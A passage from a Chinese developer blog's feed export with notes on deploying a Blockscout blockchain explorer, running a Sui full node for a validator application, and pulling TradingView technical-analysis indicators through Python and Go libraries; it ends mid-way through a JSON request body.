<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HookWebpackError: Only file and data URLs are supported by the default ESM loader</span><br></pre></td></tr></table></figure>
<p>升级node,直接重装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://nodejs.org/dist/v16.6.0/node-v16.6.0-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>
<h3 id="升级erlang">升级erlang:</h3>
<p>添加以下存储库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://packages.erlang-solutions.com/erlang-solutions-1.0-1.noarch.rpm</span><br><span class="line">$ rpm -Uvh erlang-solutions-1.0-1.noarch.rpm</span><br><span class="line"><span class="comment"># 使用以下命令更新存储库列表：</span></span><br><span class="line"></span><br><span class="line">$ yum update</span><br><span class="line"><span class="comment"># 使用以下命令安装erlang</span></span><br><span class="line">$ yum install erlang</span><br></pre></td></tr></table></figure>
<h3 id="升级elixir">升级elixir:</h3>
<p><code>https://github.com/elixir-lang/elixir/releases/download/v1.13.1/Precompiled.zip</code><br />
也是重新安装</p>
<h2 id="定义环境变量">定义环境变量</h2>
<p>以下是部署客户端时不可或缺的环境变量</p>
<table>
<thead>
<tr>
<th>环境变量</th>
<th>默认</th>
</tr>
</thead>
<tbody>
<tr>
<td>BLOCKSCOUT_VERSION</td>
<td>unknown</td>
</tr>
<tr>
<td>COIN</td>
<td>POA</td>
</tr>
<tr>
<td>DB_HOST</td>
<td>-</td>
</tr>
<tr>
<td>DB_PASSWORD</td>
<td>-</td>
</tr>
<tr>
<td>DB_PORT</td>
<td>-</td>
</tr>
<tr>
<td>DB_USERNAME</td>
<td>-</td>
</tr>
<tr>
<td>ETHEREUM_JSONRPC_HTTP_URL</td>
<td><a href="http://localhost:8545">http://localhost:8545</a></td>
</tr>
<tr>
<td>ETHEREUM_JSONRPC_TRACE_URL</td>
<td><a href="http://localhost:8545">http://localhost:8545</a></td>
</tr>
<tr>
<td>ETHEREUM_JSONRPC_WS_URL</td>
<td>ws://localhost:8546</td>
</tr>
<tr>
<td>ETHEREUM_JSONRPC_VARIANT</td>
<td>parity</td>
</tr>
<tr>
<td>HEART_BEAT_TIMEOUT</td>
<td>30</td>
</tr>
<tr>
<td>HEART_COMMAND</td>
<td>sudo systemctl restart explorer.service</td>
</tr>
<tr>
<td>LOGO</td>
<td>/images/blockscout_logo.svg</td>
</tr>
<tr>
<td>NETWORK</td>
<td>POA Network</td>
</tr>
<tr>
<td>SUBNETWORK</td>
<td>Sokol Testnet</td>
</tr>
<tr>
<td>NETWORK_ICON</td>
<td>_test_network_icon.html</td>
</tr>
<tr>
<td>LINK_TO_OTHER_EXPLORERS</td>
<td>true</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自定义环境变量</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>
<h3 id="修改全局变量debug-traceTransaction">修改全局变量debug_traceTransaction:</h3>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220829113433.png" alt="20220829113433" /><br />
浏览器程序会非常频繁的请求rpc节点的<code>debug_traceTransaction</code>方法,一般的rpc节点不支持该路径的api,会报很多错，修改全局变量降低请求频率。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在/etc/profile加入变量</span></span><br><span class="line"><span class="built_in">export</span> ETHEREUM_JSONRPC_DEBUG_TRACE_TRANSACTION_TIMEOUT=<span class="string">&quot;600s&quot;</span></span><br></pre></td></tr></table></figure>
<p>然后需要重新编译,才能生效.</p>
<p><a href="https://github.com/blockscout/blockscout/pull/5505">Manage debug_traceTransaction JSON RPC method timeout #5505</a></p>
<h2 id="部署测试效果">部署测试效果:</h2>
<p>Question List:</p>
<ol>
<li class="lvl-3">
<p>用的rpc<code>https://rpc.ankr.com/eth_ropsten</code>,不支持某些数据的获取，导致数据显示不全。问题不大，基本的流程是跑通了。</p>
</li>
<li class="lvl-3">
<p>测试server的硬件配件太差了，VMware的centos7 配置过低，等换更好的硬件后再进行后续测试。</p>
</li>
</ol>
<p>telnet一下4000端口，能通之后，再打开<code>http://192.168.2.160:4000/</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220811173627.png" alt="20220811173627" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220811173613.png" alt="20220811173613" /></p>
<h1>Others:</h1>
<h2 id="缺少txpool-content接口">缺少txpool_content接口:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 报错</span></span><br><span class="line">2022-09-15T01:43:03.220 application=indexer fetcher=pending_transaction [error] %&#123;code: -32601, message: <span class="string">&quot;the method txpool_content does not exist/is not available&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># geth启动项添加</span></span><br><span class="line">--http --http.addr 0.0.0.0 --http.api <span class="string">&quot;eth,net,web3,debug,txpool&quot;</span> --http.corsdomain <span class="string">&#x27;*&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="系统读取文件限制">系统读取文件限制:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 报错</span></span><br><span class="line">ENOSPC: System <span class="built_in">limit</span> <span class="keyword">for</span> number of file watchers reached</span><br></pre></td></tr></table></figure>
<p>解决办法:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sysctl -w fs.inotify.max_user_watches=100000</span><br><span class="line"><span class="comment"># 新增文件</span></span><br><span class="line">vim /etc/sysctl.d/10-user-watches.conf</span><br><span class="line">fs.inotify.max_user_watches = 100000</span><br></pre></td></tr></table></figure>
<p>Refs: <a href="https://stackoverflow.com/questions/53930305/nodemon-error-system-limit-for-number-of-file-watchers-reached">Nodemon Error: System limit for number of file watchers reached</a></p>
<h2 id="webpack报错">webpack报错:</h2>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">FATAL ERROR: Reached heap <span class="built_in">limit</span> Allocation failed - JavaScript heap out of memory</span><br><span class="line">致命错误：达到堆限制分配失败-JavaScript堆内存不足</span><br></pre></td></tr></table></figure>
<p>解决办法:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 全局安装  </span></span><br><span class="line">npm install -g increase-memory-limit</span><br><span class="line"><span class="comment"># 项目执行</span></span><br><span class="line">increase-memory-limit</span><br></pre></td></tr></table></figure>
<h2 id="Centos7设置代理">Centos7设置代理:</h2>
<p>临时设置（重连后失效）在命令行中直接输入下列命令即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://192.168.2.50:7890/</span><br><span class="line"><span class="built_in">export</span> https_proxy=https://192.168.2.50:7890/</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/weixin_41831919/article/details/108111208">linux的centOS下如何删除代理</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> -n http_proxy</span><br><span class="line"><span class="built_in">export</span> -n https_proxy</span><br><span class="line"><span class="built_in">export</span> -n no_proxy</span><br></pre></td></tr></table></figure>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://mhxw.life/2021-10-05-blockscout-deployment-guide/">BlockScout 开源浏览器安装部署指南</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/dahuige/p/15524428.html">Centos7下安装BlockScout</a></p>
</li>
<li class="lvl-2">
<p><a href="https://docs.blockscout.com/for-developers/information-and-settings/requirements">https://docs.blockscout.com/for-developers/information-and-settings/requirements</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/blockscout/blockscout">https://github.com/blockscout/blockscout</a></p>
</li>
<li class="lvl-2">
<p><a href="https://chainlist.org/zh">Chainlist 是 EVM 网络的列表</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/sunny05296/article/details/108458541">Centos7安装PostgreSQL 12.4 + postgis安装</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>DevRecord</category>
      </categories>
      <tags>
        <tag>DevRecord</tag>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title>DevRecord-Sui节点搭建和验证节点申请</title>
    <url>/2022/37144.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><a href="https://sui.io/resources-sui/validator-registration-open/?utm_source=social&amp;utm_medium=social&amp;utm_campaign=registervalidator">活动说明</a><br />
简言之，先跑全节点然后8.15前填表，如果被选中为验证者参与激励测试网就可以获得2000sui代币奖励。</p>
<h1>Sui公链介绍:</h1>
<p>可参考视频:<a href="https://youtu.be/bTiyATYCU20">Sui—前facebook团队和顶级机构创建的新一代区块链公链【Vic TALK 第263期】</a></p>
<h1>奖励规则:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>激励测试网团队目标是 4 轮，每一轮成功参与的验证者都可以获得 2000 枚，所以总共不只是 2000 枚。</p>
</li>
<li class="lvl-2">
<p>而且验证者只是激励网的其中一个任务而已，还有其他任务没公布呢，后面会公布其他任务，目前先开放了验证者报名入口</p>
</li>
<li class="lvl-2">
<p>总量100亿，参与测试给2000个，锁仓1年</p>
</li>
</ul>
<p>现在是第一轮奖励，要求的就是：</p>
<ol>
<li class="lvl-3">
<p>运行Sui节点</p>
</li>
<li class="lvl-3">
<p>填表申请成为验证者，审核通过再说(听天由命了…)</p>
</li>
</ol>
<h2 id="成为验证者常见问题">成为验证者常见问题:</h2>
<p>申请验证者才可以参加测试网</p>
<ol>
<li class="lvl-3">
<p>是否必须有公司才能成为验证者？  如果没有公司的话，可以填 individual</p>
</li>
<li class="lvl-3">
<p>激励测试网有多少名额可用？  没有固定数量名额</p>
</li>
<li class="lvl-3">
<p>如果我的 Coinlist 账户被封了怎么办？  我们将只能通过 CoinList 分发奖励，但我们已要求他们明确说明来自俄罗斯和中国的用户如何访问此流程。</p>
</li>
<li class="lvl-3">
<p>Devnet 节点必须强制更新到最新版本？    是的</p>
</li>
<li class="lvl-3">
<p>将有几波激励测试网？  目标是 4 波</p>
</li>
<li class="lvl-3">
<p>对于 KYC，我可以编辑我的电子邮件以使用 Coinlist 电子邮件吗？  如果你被选中，我们会要求你使用现有的 Coinlist 账户（如果你有的话）</p>
</li>
<li class="lvl-3">
<p>我可以用新电子邮件重新填写申请表格吗？  可以</p>
</li>
<li class="lvl-3">
<p>如果我需要通过 KYC，我可以更改我的电子邮件地址吗？因为我用于 KYC 的电子邮件和我用于填写表单的电子邮件不同？  是的，你可以使用一个不同的电子邮件来处理 KYC 问题。</p>
</li>
<li class="lvl-3">
<p>填写表格的截止日期是什么时候？  我们将在 8 月 15 日关闭申请。</p>
</li>
<li class="lvl-4">
<p>那些运行节点但没有发送 IP 到 discord 频道 node-ip-application的成员怎么办？  您必须在表格上提供 IP</p>
</li>
<li class="lvl-4">
<p>我在频道中共享了 2 个 IP 地址。我应该在表格上提交哪一个？  你想让我们检查的那个</p>
</li>
<li class="lvl-4">
<p>有多少人会被选中？  暂时没有限制</p>
</li>
</ol>
<blockquote>
<p>简单了解完规则后,现在我们先要运行Sui节点.</p>
</blockquote>
<h1>Vps选购:</h1>
<p>官方推荐配置要求：<code>m5.2xlarge (8vCPU, 32GB RAM) + 128GB SSD</code></p>
<h2 id="hetzner">hetzner:</h2>
<p>信息收集了一波后，这家vps提供商<a href="https://www.hetzner.com/">hetzner</a>性价比比较高。<br />
<a href="https://www.hetzner.com/dedicated-rootserver/matrix-ax">套餐页面</a>:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220813152542.png" alt="20220813152542" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220806134128.png" alt="20220806134128" /><br />
实名认证后，就可以购买服务器了。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220813111147.png" alt="20220813111147" /><br />
14天试用期，不用先付钱，后来看到<code>contabo</code>的套餐更便宜，就把这个删了。</p>
<h2 id="contabo">contabo:</h2>
<p><a href="https://contabo.com/en/">contabo</a><br />
套餐页面：<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220813153409.png" alt="20220813153409" /><br />
选配下来后，大约23、24$每个月(PayPal支付)。</p>
<h1>运行全节点:</h1>
<h2 id="源码构建">源码构建:</h2>
<p>参考<a href="https://medium.com/coinmonks/tutorial-how-to-install-a-full-node-on-the-sui-network-of-mysten-labs-for-beginners-devnet-e482aa30537a">Tutorial — How to install a Full node on the SUI network of Mysten Labs for beginners — DEVNET</a><br />
其实挺简单的：就是装依赖、拉Sui节点代码、设置好配置文件、编译运行节点即可。<br />
最后再升级一下，不然会有很多报错。参考<a href="https://docs.sui.io/build/fullnode?utm_source=blog&amp;utm_medium=website&amp;utm_campaign=registrvalidators#built-from-source">官方文档</a>进行升级<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220806164432.png" alt="20220806164432" /></p>
<h2 id="检测节点状态">检测节点状态:</h2>
<p>然后再在这个网站检查一下节点状态 <a href="https://node.sui.zvalid.com/">https://node.sui.zvalid.com/</a><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220806163609.png" alt="20220806163609" /></p>
<blockquote>
<p>至此，如果检测正常，那么全节点就运行起来了。</p>
</blockquote>
<h2 id="docker构建">docker构建:</h2>
<p>没试这种方式，需要敲的命令比较少，请参考:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://mirror.xyz/0x2ba8f8db6c26fB36F14F9a8c32158e201632d677/zajDQ7XDUTdFIzklZs7TG0Aw-OfQ76z6FzUzRGKjalo">如何0基础学会搭建Sui 开发网全节点 | 节点教程</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.theblockbeats.info/news/31505">新公链Sui测试网明牌奖励，手把手教你搭建节点</a></p>
</li>
</ul>
<h1>填写申请表:</h1>
<p>填写申请表: <a href="https://airtable.com/shr3phh3FCZYhZUDF">https://airtable.com/shr3phh3FCZYhZUDF</a><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220813110832.png" alt="20220813110832" /></p>
<blockquote>
<p>至此，第一轮奖励活动，我们要做的工作就做完了，接下来就是等审核，听天由命。。。</p>
</blockquote>
<h1>审核结果:</h1>
<blockquote>
<p>20220830 update</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220830110859.png" alt="20220830110859" /><br />
收到sui团队的通知邮件,审核没通过<br />
删除Vps,取消订阅<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220830111248.png" alt="20220830111248" /></p>
<blockquote>
<p>告一段落,试错成本为24u</p>
</blockquote>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://docs.sui.io/build/fullnode?utm_source=blog&amp;utm_medium=website&amp;utm_campaign=registrvalidators">Run a Sui Fullnode</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cheshirex.com/7171.html">Hetzner德国芬兰高配物理服务器购买流程</a></p>
</li>
<li class="lvl-2">
<p><a href="https://medium.com/coinmonks/tutorial-how-to-install-a-full-node-on-the-sui-network-of-mysten-labs-for-beginners-devnet-e482aa30537a">Tutorial — How to install a Full node on the SUI network of Mysten Labs for beginners — DEVNET</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>DevRecord</category>
      </categories>
      <tags>
        <tag>DevRecord</tag>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title>DevRecord-TradingView技术分析指标API</title>
    <url>/2022/57835.html</url>
    <content><![CDATA[<h1>介绍:</h1>
<p>Technical Ratings是一种技术分析工具，它结合了几种技术指标的评级，使交易者和投资者更容易找到有利可图的交易。<br />
URL：<a href="https://www.tradingview.com/symbols/BTCUSDT/technicals/">https://www.tradingview.com/symbols/BTCUSDT/technicals/</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221213162900.png" alt="20221213162900" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221213162917.png" alt="20221213162917" /><br />
通过几个技术指标，来分析出买卖信号，具体的计算方法可见<a href="https://www.tradingview.com/support/solutions/43000614331/">网页</a>。<br />
大致有以下指标：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>MACD</p>
</li>
<li class="lvl-2">
<p>RSI</p>
</li>
<li class="lvl-2">
<p>移动平均线</p>
</li>
<li class="lvl-2">
<p>布林带</p>
</li>
<li class="lvl-2">
<p>等等</p>
</li>
</ul>
<h1>相关github仓库:</h1>
<h2 id="python版本：">python版本：</h2>
<p>仓库地址:<a href="https://github.com/brian-the-dev/python-tradingview-ta">python-tradingview-ta</a><br />
演示界面:<a href="https://tradingview.brianthe.dev/">TradingView-TA Demo</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20221213163254.png" alt="20221213163254" /><br />
示例代码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tradingview_ta <span class="keyword">import</span> TA_Handler, Interval, Exchange</span><br><span class="line"></span><br><span class="line">tesla = TA_Handler(</span><br><span class="line">    symbol=<span class="string">&quot;BTCUSDT&quot;</span>,</span><br><span class="line">    screener=<span class="string">&quot;CRYPTO&quot;</span>,</span><br><span class="line">    exchange=<span class="string">&quot;BINANCE&quot;</span>,</span><br><span class="line">    interval=Interval.INTERVAL_1_HOUR,</span><br><span class="line">    <span class="comment"># proxies=&#123;&#x27;http&#x27;: &#x27;http://example.com:8080&#x27;&#125; # Uncomment to enable proxy (replace the URL).</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(tesla.get_analysis().summary)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example output: &#123;&quot;RECOMMENDATION&quot;: &quot;BUY&quot;, &quot;BUY&quot;: 8, &quot;NEUTRAL&quot;: 6, &quot;SELL&quot;: 3&#125;</span></span><br><span class="line"></span><br><span class="line">res = tesla.get_indicators()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>输出的结果:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;RECOMMENDATION&#x27;</span>: <span class="string">&#x27;BUY&#x27;</span>, <span class="string">&#x27;BUY&#x27;</span>: 10, <span class="string">&#x27;SELL&#x27;</span>: 6, <span class="string">&#x27;NEUTRAL&#x27;</span>: 10&#125;</span><br><span class="line">&#123;<span class="string">&#x27;Recommend.Other&#x27;</span>: 0, <span class="string">&#x27;Recommend.All&#x27;</span>: 0.13333333, <span class="string">&#x27;Recommend.MA&#x27;</span>: 0.26666667, <span class="string">&#x27;RSI&#x27;</span>: 50.48192749, <span class="string">&#x27;RSI[1]&#x27;</span>: 58.39674711, <span class="string">&#x27;Stoch.K&#x27;</span>: 61.87618536, <span class="string">&#x27;Stoch.D&#x27;</span>: 68.87650451, <span class="string">&#x27;Stoch.K[1]&#x27;</span>: 72.05141966, <span class="string">&#x27;Stoch.D[1]&#x27;</span>: 71.27973346, <span class="string">&#x27;CCI20&#x27;</span>: 16.16247248, <span class="string">&#x27;CCI20[1]&#x27;</span>: 65.48078005, <span class="string">&#x27;ADX&#x27;</span>: 28.61095394, <span class="string">&#x27;ADX+DI&#x27;</span>: 25.27158154, <span class="string">&#x27;ADX-DI&#x27;</span>: 20.48667952, <span class="string">&#x27;ADX+DI[1]&#x27;</span>: 27.92566556, <span class="string">&#x27;ADX-DI[1]&#x27;</span>: 14.19797254, <span class="string">&#x27;AO&#x27;</span>: 114.26505882, <span class="string">&#x27;AO[1]&#x27;</span>: 118.24585294, <span class="string">&#x27;Mom&#x27;</span>: -72.33, <span class="string">&#x27;Mom[1]&#x27;</span>: 28.37, <span class="string">&#x27;MACD.macd&#x27;</span>: 31.12953057, <span class="string">&#x27;MACD.signal&#x27;</span>: 27.97914839, <span class="string">&#x27;Rec.Stoch.RSI&#x27;</span>: 0, <span class="string">&#x27;Stoch.RSI.K&#x27;</span>: 38.74649592, <span class="string">&#x27;Rec.WR&#x27;</span>: 0, <span class="string">&#x27;W.R&#x27;</span>: -58.48706151, <span class="string">&#x27;Rec.BBPower&#x27;</span>: 0, <span class="string">&#x27;BBPower&#x27;</span>: -20.57747939, <span class="string">&#x27;Rec.UO&#x27;</span>: 0, <span class="string">&#x27;UO&#x27;</span>: 47.95794838, <span class="string">&#x27;close&#x27;</span>: 17103.34, <span class="string">&#x27;EMA5&#x27;</span>: 17142.2328455, <span class="string">&#x27;SMA5&#x27;</span>: 17152.532, <span class="string">&#x27;EMA10&#x27;</span>: 17138.1040694, <span class="string">&#x27;SMA10&#x27;</span>: 17158.701, <span class="string">&#x27;EMA20&#x27;</span>: 17110.96833468, <span class="string">&#x27;SMA20&#x27;</span>: 17096.297, <span class="string">&#x27;EMA30&#x27;</span>: 17097.41772984, <span class="string">&#x27;SMA30&#x27;</span>: 17045.36033333, <span class="string">&#x27;EMA50&#x27;</span>: 17091.82731247, <span class="string">&#x27;SMA50&#x27;</span>: 17080.842, <span class="string">&#x27;EMA100&#x27;</span>: 17085.73943901, <span class="string">&#x27;SMA100&#x27;</span>: 17123.7011, <span class="string">&#x27;EMA200&#x27;</span>: 17045.31878646, <span class="string">&#x27;SMA200&#x27;</span>: 17065.14255, <span class="string">&#x27;Rec.Ichimoku&#x27;</span>: 0, <span class="string">&#x27;Ichimoku.BLine&#x27;</span>: 17072.69, <span class="string">&#x27;Rec.VWMA&#x27;</span>: 1, <span class="string">&#x27;VWMA&#x27;</span>: 17091.35386908, <span class="string">&#x27;Rec.HullMA9&#x27;</span>: -1, <span class="string">&#x27;HullMA9&#x27;</span>: 17150.65207407, <span class="string">&#x27;Pivot.M.Classic.S3&#x27;</span>: 15571.87, <span class="string">&#x27;Pivot.M.Classic.S2&#x27;</span>: 16317.29, <span class="string">&#x27;Pivot.M.Classic.S1&#x27;</span>: 16701.17, <span class="string">&#x27;Pivot.M.Classic.Middle&#x27;</span>: 17062.71, <span class="string">&#x27;Pivot.M.Classic.R1&#x27;</span>: 17446.59, <span class="string">&#x27;Pivot.M.Classic.R2&#x27;</span>: 17808.13, <span class="string">&#x27;Pivot.M.Classic.R3&#x27;</span>: 18553.55, <span class="string">&#x27;Pivot.M.Fibonacci.S3&#x27;</span>: 16317.29, <span class="string">&#x27;Pivot.M.Fibonacci.S2&#x27;</span>: 16602.04044, <span class="string">&#x27;Pivot.M.Fibonacci.S1&#x27;</span>: 16777.95956, <span class="string">&#x27;Pivot.M.Fibonacci.Middle&#x27;</span>: 17062.71, <span class="string">&#x27;Pivot.M.Fibonacci.R1&#x27;</span>: 17347.46044, <span class="string">&#x27;Pivot.M.Fibonacci.R2&#x27;</span>: 17523.37956, <span class="string">&#x27;Pivot.M.Fibonacci.R3&#x27;</span>: 17808.13, <span class="string">&#x27;Pivot.M.Camarilla.S3&#x27;</span>: 16880.0595, <span class="string">&#x27;Pivot.M.Camarilla.S2&#x27;</span>: 16948.38966667, <span class="string">&#x27;Pivot.M.Camarilla.S1&#x27;</span>: 17016.71983333, <span class="string">&#x27;Pivot.M.Camarilla.Middle&#x27;</span>: 17062.71, <span class="string">&#x27;Pivot.M.Camarilla.R1&#x27;</span>: 17153.38016667, <span class="string">&#x27;Pivot.M.Camarilla.R2&#x27;</span>: 17221.71033333, <span class="string">&#x27;Pivot.M.Camarilla.R3&#x27;</span>: 17290.0405, <span class="string">&#x27;Pivot.M.Woodie.S3&#x27;</span>: 15966.92, <span class="string">&#x27;Pivot.M.Woodie.S2&#x27;</span>: 16322.875, <span class="string">&#x27;Pivot.M.Woodie.S1&#x27;</span>: 16712.34, <span class="string">&#x27;Pivot.M.Woodie.Middle&#x27;</span>: 17068.295, <span class="string">&#x27;Pivot.M.Woodie.R1&#x27;</span>: 17457.76, <span class="string">&#x27;Pivot.M.Woodie.R2&#x27;</span>: 17813.715, <span class="string">&#x27;Pivot.M.Woodie.R3&#x27;</span>: 18203.18, <span class="string">&#x27;Pivot.M.Demark.S1&#x27;</span>: 16509.23, <span class="string">&#x27;Pivot.M.Demark.Middle&#x27;</span>: 16966.74, <span class="string">&#x27;Pivot.M.Demark.R1&#x27;</span>: 17254.65, <span class="string">&#x27;open&#x27;</span>: 17151.56, <span class="string">&#x27;P.SAR&#x27;</span>: 17241.89, <span class="string">&#x27;BB.lower&#x27;</span>: 16938.43248872, <span class="string">&#x27;BB.upper&#x27;</span>: 17254.16151128, <span class="string">&#x27;AO[2]&#x27;</span>: 115.21276471, <span class="string">&#x27;volume&#x27;</span>: 7491.87152, <span class="string">&#x27;change&#x27;</span>: -0.28114061, <span class="string">&#x27;low&#x27;</span>: 17083.08, <span class="string">&#x27;high&#x27;</span>: 17155.15&#125;</span><br></pre></td></tr></table></figure>
<h2 id="go版本：">go版本：</h2>
<p>仓库地址:<a href="https://github.com/dematron/go-tvscanner">go-tvscanner</a><br />
参考该仓库,知道怎么构造出post的数据包:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;symbols&quot;</span>:&#123;<span class="string">&quot;tickers&quot;</span>:[<span class="string">&quot;BINANCE:BTCUSDT&quot;</span>],<span class="string">&quot;query&quot;</span>:&#123;<span class="string">&quot;types&quot;</span>:[]&#125;&#125;,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;Recommend.Other|120&quot;</span>,<span class="string">&quot;Recommend.All|120&quot;</span>,<span class="string">&quot;Recommend.MA|120&quot;</span>,<span class="string">&quot;RSI|120&quot;</span>,<span class="string">&quot;RSI[1]|120&quot;</span>,<span class="string">&quot;Stoch.K|120&quot;</span>,<span class="string">&quot;Stoch.D|120&quot;</span>,<span class="string">&quot;Stoch.K[1]|120&quot;</span>,<span class="string">&quot;Stoch.D[1]|120&quot;</span>,<span class="string">&quot;CCI20|120&quot;</span>,<span class="string">&quot;CCI20[1]|120&quot;</span>,<span class="string">&quot;ADX|120&quot;</span>,<span class="string">&quot;ADX+DI|120&quot;</span>,<span class="string">&quot;ADX-DI|120&quot;</span>,<span class="string">&quot;ADX+DI[1]|120&quot;</span>,<span class="string">&quot;ADX-DI[1]|120&quot;</span>,<span class="string">&quot;AO|120&quot;</span>,<span class="string">&quot;AO[1]|120&quot;</span>,<span class="string">&quot;AO[2]|120&quot;</span>,<span class="string">&quot;Mom|120&quot;</span>,<span class="string">&quot;Mom[1]|120&quot;</span>,<span class="string">&quot;MACD.macd|120&quot;</span>,<span class="string">&quot;MACD.signal|120&quot;</span>,<span class="string">&quot;Rec.Stoch.RSI|120&quot;</span>,<span class="string">&quot;Stoch.RSI.K|120&quot;</span>,<span class="string">&quot;Rec.WR|120&quot;</span>,<span class="string">&quot;W.R|120&quot;</span>,<span class="string">&quot;Rec.BBPower|120&quot;</span>,<span class="string">&quot;BBPower|120&quot;</span>,<span class="string">&quot;Rec.UO|120&quot;</span>,<span class="string">&quot;UO|120&quot;</span>,<span class="string">&quot;EMA10|120&quot;</span>,<span class="string">&quot;close|120&quot;</span>,<span class="string">&quot;SMA10|120&quot;</span>,<span class="string">&quot;EMA20|120&quot;</span>,<span class="string">&quot;SMA20|120&quot;</span>,<span class="string">&quot;EMA30|120&quot;</span>,<span class="string">&quot;SMA30|120&quot;</span>,<span class="string">&quot;EMA50|120&quot;</span>,<span class="string">&quot;SMA50|120&quot;</span>,<span class="string">&quot;EMA100|120&quot;</span>,<span class="string">&quot;SMA100|120&quot;</span>,<span class="string">&quot;EMA200|120&quot;</span>,<span class="string">&quot;SMA200|120&quot;</span>,<span class="string">&quot;Rec.Ichimoku|120&quot;</span>,<span class="string">&quot;Ichimoku.BLine|120&quot;</span>,<span class="string">&quot;Rec.VWMA|120&quot;</span>,<span class="string">&quot;VWMA|120&quot;</span>,<span class="string">&quot;Rec.HullMA9|120&quot;</span>,<span class="string">&quot;HullMA9|120&quot;</span>,<span class="string">&quot;Pivot.M.Classic.S3|120&quot;</span>,<span class="string">&quot;Pivot.M.Classic.S2|120&quot;</span>,<span class="string">&quot;Pivot.M.Classic.S1|120&quot;</span>,<span class="string">&quot;Pivot.M.Classic.Middle|120&quot;</span>,<span class="string">&quot;Pivot.M.Classic.R1|120&quot;</span>,<span class="string">&quot;Pivot.M.Classic.R2|120&quot;</span>,<span class="string">&quot;Pivot.M.Classic.R3|120&quot;</span>,<span class="string">&quot;Pivot.M.Fibonacci.S3|120&quot;</span>,<span class="string">&quot;Pivot.M.Fibonacci.S2|120&quot;</span>,<span class="string">&quot;Pivot.M.Fibonacci.S1|120&quot;</span>,<span class="string">&quot;Pivot.M.Fibonacci.Middle|120&quot;</span>,<span class="string">&quot;Pivot.M.Fibonacci.R1|120&quot;</span>,<span class="string">&quot;Pivot.M.Fibonacci.R2|120&quot;</span>,<span class="string">&quot;Pivot.M.Fibonacci.R3|120&quot;</span>,<span class="string">&quot;Pivot.M.Camarilla.S3|120&quot;</span>,<span class="string">&quot;Pivot.M.Camarilla.S2|120&quot;</span>,<span class="string">&quot;Pivot.M.Camarilla.S1|120&quot;</span>,<span class="string">&quot;Pivot.M.Camarilla.Middle|120&quot;</span>,<span class="string">&quot;Pivot.M.Camarilla.R1|120&quot;</span>,<span class="string">&quot;Pivot.M.Camarilla.R2|120&quot;</span>,<span class="string">&quot;Pivot.M.Camarilla.R3|120&quot;</span>,<span class="string">&quot;Pivot.M.Woodie.S3|120&quot;</span>,<span class="string">&quot;Pivot.M.Woodie.S2|120&quot;</span>,<span class="string">&quot;Pivot.M.Woodie.S1|120&quot;</span>,<span class="string">&quot;Pivot.M.Woodie.Middle|120&quot;</span>,<span 